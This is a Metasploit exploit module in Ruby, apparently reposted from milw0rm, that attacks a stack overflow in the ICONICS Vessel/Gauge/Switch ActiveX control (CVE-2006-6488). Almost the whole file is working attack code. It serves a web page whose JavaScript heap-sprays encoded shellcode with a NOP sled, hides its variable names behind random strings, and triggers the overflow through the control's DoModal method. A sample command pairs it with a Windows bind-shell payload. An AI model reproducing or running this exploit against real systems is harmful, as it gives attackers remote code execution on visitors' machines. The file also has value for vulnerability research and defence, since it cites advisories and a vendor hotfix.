##
# $Id: iconics_dlgwrapper.rb 1 2008-09-21 22:43:00Z kf $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##
#
# $ msfcli exploit/windows/browser/iconics_dlgwrapper RHOST=10.211.55.6 PAYLOAD=windows/shell_bind_tcp E

require 'msf/core'

module Msf

class Exploits::Windows::Browser::Iconics_Dlgwrapper < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ICONICS Vessel / Gauge / Switch 8.02.140 ActiveX DoModal Overflow',
			'Description'    => %q{
					This module exploits a stack overflow in the Iconics Vessel / Gauge / Switch ActiveX controls
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'tebo', 'kf' ], 
			'Version'        => '$Revision: 2 $',
			'References'     => 
				[
					[ 'URL', 'http://www.kb.cert.org/vuls/id/251969' ],
					[ 'URL', 'http://www.securityfocus.com/bid/21849/info' ],
					[ 'URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6488' ],
					[ 'URL', 'http://www.iconics.com/support/free_tools/FreeToolsActiveX_DlgWrapperHotFix.zip' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars'      => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# This most likely works with Switch and Gauge ActiveX controls as well 
					# Thanks for the target testing tebo. Verified on 2kSP4, XPSP0, XPSP2, XPSP3 
					[ 'ICONICS Vessel ActiveX 8.02.140 - Universal EIP hit', { 'Payload' => { 'Space' => 412 } } ],
				],
			'DisclosureDate' => 'Jan 10 2007',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
                # Re-generate the payload  
                return if ((p = regenerate_payload(cli)) == nil)
                # Encode the shellcode
                shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

                # Randomize the javascript variable names
                var_i  = rand_text_alpha(rand(30)  + 2)
                rand1  = rand_text_alpha(rand(100) + 1)
                rand2  = rand_text_alpha(rand(100) + 1)
                rand3  = rand_text_alpha(rand(100) + 1)
                rand4  = rand_text_alpha(rand(100) + 1)
                rand5  = rand_text_alpha(rand(100) + 1)
                rand6  = rand_text_alpha(rand(100) + 1)
                rand7  = rand_text_alpha(rand(100) + 1)
                rand8  = rand_text_alpha(rand(100) + 1)
                rand9  = rand_text_alpha(rand(100) + 1)
		rand10 = Rex::Text.to_unescape(rand_text_alpha(1), Rex::Arch.endian(target.arch))

		idname	= "DlgWrapper"
		targetname	= rand_text_alpha(rand(100) + 1)

		content = %Q|
			<html>
			<object classid='clsid:9d6bd878-b8eb-47e5-ab1c-87d74173baa' id='#{idname}'></object>
			<script language='javascript'>
			// begin skylined technique - use the common MSF randomized version.
			var #{rand1} = unescape('#{shellcode}');
			var #{rand2} = unescape("%u0d0d%u0d0d");	// unicode nops.... 
			var #{rand3} = 20;
			var #{rand4} = #{rand3} + #{rand1}.length;
			while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
			var #{rand5} = #{rand2}.substring(0,#{rand4});
			var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
			while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
			var #{rand7} = new Array();  
			for (#{var_i} = 0; #{var_i} < 500; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} };
			var #{rand8} = "";
			for (#{var_i} = 0; #{var_i} < #{payload_space}; #{var_i}++) { #{rand8} = #{rand8} + unescape("#{rand10}") };
			#{rand8} = #{rand8} + unescape("%0c%0c%0c%0c"); // Return address for the heap sprayed nop sled
			var #{targetname} = new ActiveXObject("#{idname}.BrowseFile.1");
			#{targetname}.DoModal(#{rand8},"#{rand9}");   // Trigger line
			</script>
			</html>
                  |
		
		print_status("Note: The free ActiveX Controls (Gauge, Switch & Vessel) have a hotfix available.")
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")
		send_response_html(cli, content)
		handler(cli)
	end

end
end

# milw0rm.com [2008-09-25]